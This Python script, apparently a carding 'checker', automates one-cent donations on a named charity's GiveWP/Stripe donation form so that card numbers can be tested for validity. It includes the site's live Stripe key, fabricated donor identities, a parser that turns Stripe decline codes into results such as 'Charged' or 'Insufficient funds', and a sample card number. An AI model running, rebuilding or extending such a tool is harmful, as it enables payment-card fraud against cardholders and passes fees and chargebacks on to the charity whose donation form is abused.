# Charge3.py - v1.3: Fixed double URL encoding for return_url

import requests
import re
import json
import random
import string
import time
from urllib.parse import quote_plus
# Removed BeautifulSoup for now, as initial attempt uses fixed params

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))
def generate_first_name(length=7):
    first_names_list = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole", "Nicholas", "Anthony", "Heather", "Eric", "Elizabeth", "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Abigail", "Madison", "Charlotte", "Liam", "Noah", "Jacob", "Ethan", "Alexander", "William", "Benjamin", "Lucas", "Henry"]
    return random.choice(first_names_list)
def generate_last_name(length=9):
    last_names_list = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Green", "Baker", "Adams", "Nelson", "Carter"]
    return random.choice(last_names_list)
def generate_email_username(first, last, length=4):
    num = generate_random_string(length, string.digits); sep = random.choice(['.', '_', '']); return f"{first.lower()}{sep}{last.lower()}{num}"
def generate_phone(length=10):
    return generate_random_string(length, string.digits)
# --- End Generation ---

def SaintVinsonDonateCheckout(ccx):
    """
    Attempts donation via saintvinsoneugeneallen.com using GiveWP + Stripe.
    V1.3 fixes return_url double encoding. Still uses fixed init parameters.

    Args: ccx (str): Card details "NUMBER|MM|YY|CVC".
    Returns: str: Status message.
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip(); parts = ccx.split("|")
        if len(parts) != 4: return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        n, mm, yy, cvc = parts
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()): return "Error: Card parts must be numeric"
        if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
        elif len(yy) != 2: return f"Error: Invalid year format: {yy}. Use YY or 20YY."
        mm = mm.zfill(2); n_no_spaces = n.replace(' ', '')
    except Exception as parse_e: return f"Error parsing card details: {parse_e}"

    # --- Session and User Data ---
    session = requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    session.headers.update({'User-Agent': ua})
    first_name = generate_first_name(); last_name = generate_last_name()
    email_user_part = generate_email_username(first_name, last_name)
    email_domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"])
    email = f"{email_user_part}@{email_domain}"
    full_name = f"{first_name} {last_name}"
    street = "45 Main St"; city = "Anytown"; state = "CA"; postal_code = "90210"; country = "US"
    stripe_pk = 'pk_live_51OhyQ8HIO40pYhlcsp8D7XfGuyDCoJHOG4p3VJjMLnupEmwsB2pwjHN0TVHO29UG0k9lS4g1sZHSq3GnBtGmegmU001n7FlqBX'

    # --- Step 1: Initiate Donation (POST to site) ---
    initiate_url = 'https://www.saintvinsoneugeneallen.com/'
    initiate_params = { 'givewp-route': 'donate', 'givewp-route-signature': '6aa71ec2c577fa333220fb30c92704eb', 'givewp-route-signature-id': 'givewp-donate', 'givewp-route-signature-expiration': '1745926564', } # Fixed, will likely fail
    initiate_headers = { 'authority': 'www.saintvinsoneugeneallen.com', 'accept': 'application/json', 'accept-language': 'en-US,en;q=0.9', 'origin': 'https://www.saintvinsoneugeneallen.com', 'referer': 'https://www.saintvinsoneugeneallen.com/?givewp-route=donation-form-view&form-id=3256&locale=en', 'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': ua, }
    initiate_files_data = { 'amount': (None, '0.01'), 'currency': (None, 'USD'), 'donationType': (None, 'single'), 'formId': (None, '3256'), 'gatewayId': (None, 'stripe_payment_element'), 'firstName': (None, first_name), 'lastName': (None, last_name), 'email': (None, email), 'donationBirthday': (None, ''), 'originUrl': (None, 'https://www.saintvinsoneugeneallen.com/donate/'), 'isEmbed': (None, 'true'), 'embedId': (None, 'give-form-shortcode-1'), 'locale': (None, 'en'), 'gatewayData[stripePaymentMethod]': (None, 'card'), 'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'), 'gatewayData[formId]': (None, '3256'), 'gatewayData[stripeKey]': (None, stripe_pk), 'gatewayData[stripeConnectedAccountId]': (None, 'acct_1OhyQ8HIO40pYhlc'), }
    payment_intent_id = None; client_secret = None
    try:
        response_init = session.post(initiate_url, params=initiate_params, headers=initiate_headers, files=initiate_files_data, timeout=25)
        if response_init.status_code == 400 and 'Invalid signature' in response_init.text: return "Error: Step 1 Failed - Invalid/Expired Signature (Need dynamic scraping)"
        if response_init.status_code == 403: return "Error: Step 1 Failed - Request Forbidden (403)"
        response_init.raise_for_status()
        init_json = response_init.json()
        client_secret = init_json.get('data', {}).get('clientSecret') or init_json.get('client_secret')
        if client_secret: match = re.match(r"(pi_\w+)_secret_", client_secret); payment_intent_id = match.group(1) if match else None
        if not payment_intent_id or not client_secret: err_msg = init_json.get('message') or init_json.get('error') or 'PI/Secret not found'; return f"Error: Step 1 Failed - Could not get Payment Intent/Secret ({str(err_msg)[:50]})"
    except requests.exceptions.RequestException as e: return f"Error: Step 1 Failed - Network Error: {e}"
    except json.JSONDecodeError: return f"Error: Step 1 Failed - Invalid JSON response from server"
    except Exception as e: return f"Error: Step 1 Failed - Unexpected error: {e}"

    # --- Step 2: Confirm Payment Intent (POST to Stripe) ---
    confirm_url = f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm'
    stripe_headers = { 'authority': 'api.stripe.com', 'accept': 'application/json', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua, }

    # *** FIX: Define return_url as plain string ***
    simple_return_url = 'https://www.saintvinsoneugeneallen.com/donate/?givewp-donation-confirmed=success'
    # *** END FIX ***

    guid_s = f'guid_{generate_random_string(32)}'; muid_s = session.cookies.get('__stripe_mid', f'mid_{generate_random_string(32)}'); sid_s = session.cookies.get('__stripe_sid', f'sid_{generate_random_string(32)}')

    stripe_data_dict = {
        'return_url': simple_return_url, # Assign plain string
        'payment_method_data[billing_details][name]': full_name,
        'payment_method_data[billing_details][email]': email,
        'payment_method_data[billing_details][address][country]': country,
        'payment_method_data[billing_details][address][postal_code]': postal_code,
        'payment_method_data[billing_details][address][line1]': street,
        'payment_method_data[billing_details][address][city]': city,
        'payment_method_data[billing_details][address][state]': state,
        'payment_method_data[type]': 'card',
        'payment_method_data[card][number]': n_no_spaces,
        'payment_method_data[card][cvc]': cvc,
        'payment_method_data[card][exp_year]': yy,
        'payment_method_data[card][exp_month]': mm,
        'payment_method_data[allow_redisplay]': 'unspecified',
        'payment_method_data[payment_user_agent]': 'stripe.js/b85ba7b837; stripe-js-v3/b85ba7b837; payment-element; deferred-intent; autopm',
        'payment_method_data[referrer]': quote_plus('https://www.saintvinsoneugeneallen.com'),
        'payment_method_data[time_on_page]': random.randint(60000, 120000),
        'payment_method_data[guid]': guid_s, 'payment_method_data[muid]': muid_s, 'payment_method_data[sid]': sid_s,
        'expected_payment_method_type': 'card',
        'key': stripe_pk,
        'client_secret': client_secret
    }
    # Encode the dictionary values ONCE here
    stripe_data_encoded = '&'.join([f"{key}={quote_plus(str(value))}" for key, value in stripe_data_dict.items()])

    try:
        response_confirm = session.post(confirm_url, headers=stripe_headers, data=stripe_data_encoded, timeout=35)
        confirm_json = response_confirm.json()

        # --- Parse Stripe Response ---
        if 'error' in confirm_json:
            err = confirm_json['error']; msg = err.get('message', "Unknown Stripe Error"); code = err.get('code'); decline_code = err.get('decline_code')
            msg_lower = msg.lower()
            if decline_code == 'insufficient_funds' or 'insufficient funds' in msg_lower: return "Insufficient funds."
            if decline_code == 'incorrect_cvc' or decline_code == 'invalid_cvc' or 'security code is incorrect' in msg_lower: return "Your card's security code is incorrect."
            if decline_code == 'expired_card' or 'expired card' in msg_lower: return "Your card has expired."
            if decline_code == 'incorrect_number' or 'invalid_number' in msg_lower: return "Your card number is incorrect."
            if decline_code == 'incorrect_zip' or code == 'incorrect_zip': return "Declined (AVS - Postal Code)"
            if decline_code == 'incorrect_address' or code == 'incorrect_address': return "Declined (AVS - Address)"
            if decline_code == 'card_declined' or 'card was declined' in msg_lower: return "Your card was declined."
            if decline_code == 'generic_decline': return "Declined (Generic Decline)"
            if decline_code == 'do_not_honor': return "Declined (Do Not Honor)"
            if decline_code == 'pickup_card': return "Declined (Pickup Card)"
            if code == 'payment_intent_authentication_failure': return "Declined (Authentication Failure)"
            if code == 'api_key_expired' or 'provide an api key' in msg_lower: return "Error: Stripe API Key Missing/Invalid in Confirm"
            if code == 'parameter_missing' and err.get('param') == 'client_secret': return "Error: Client Secret missing in confirm request (Code Issue)"
            # Added check for the error we just saw
            if code == 'url_invalid' and err.get('param') == 'return_url': return "Error: Invalid Return URL sent to Stripe (Code Issue)"
            return f"Declined ({msg})"
        elif 'status' in confirm_json:
            status = confirm_json['status']
            if status == 'succeeded': return "Charged"
            elif status == 'requires_action':
                next_action = confirm_json.get('next_action', {})
                if isinstance(next_action, dict) and next_action.get('type') == 'redirect_to_url': return "3DS/Action Required"
                else: return "Action Required (Non-Redirect)"
            elif status == 'requires_payment_method':
                 last_error = confirm_json.get('last_payment_error', {})
                 if last_error and isinstance(last_error, dict):
                      msg = last_error.get('message', "Card declined (Requires new PM)"); decline_code = last_error.get('decline_code')
                      if decline_code == 'insufficient_funds': return "Insufficient funds."
                      if decline_code == 'incorrect_cvc' or decline_code == 'invalid_cvc': return "Your card's security code is incorrect."
                      if decline_code == 'expired_card': return "Your card has expired."
                      if decline_code == 'card_declined': return "Your card was declined."
                      return f"Declined ({msg})"
                 else: return "Declined (Requires New Payment Method)"
            elif status == 'processing': return "Processing"
            else: return f"Unknown Status: {status}"
        else: return "Unknown Stripe Response Structure"
    except requests.exceptions.RequestException as e: return f"Error: Step 2 Failed - Stripe Confirm Network Error: {e}"
    except json.JSONDecodeError: return f"Error: Step 2 Failed - Invalid JSON response from Stripe"
    except Exception as e: return f"Error: Step 2 Failed - Unexpected error during Stripe Confirm: {e}"

# --- Example Usage Block ---
if __name__ == "__main__":
    test_cc = "5598880397646656|06|31|677" # <<< PUT A VALID TEST CARD HERE
    if "TEST_CARD_HERE" in test_cc: print("Please replace 'VISA_OR_MC_TEST_CARD_HERE' with an actual card number for testing.")
    else: print(f"Attempting donation checkout for: {test_cc.split('|')[0][:4]}********"); result = SaintVinsonDonateCheckout(test_cc); print("\n--- Checkout Result (SaintVinson / GiveWP / Stripe Element v1.3) ---"); print(result); print("--- End of Result ---")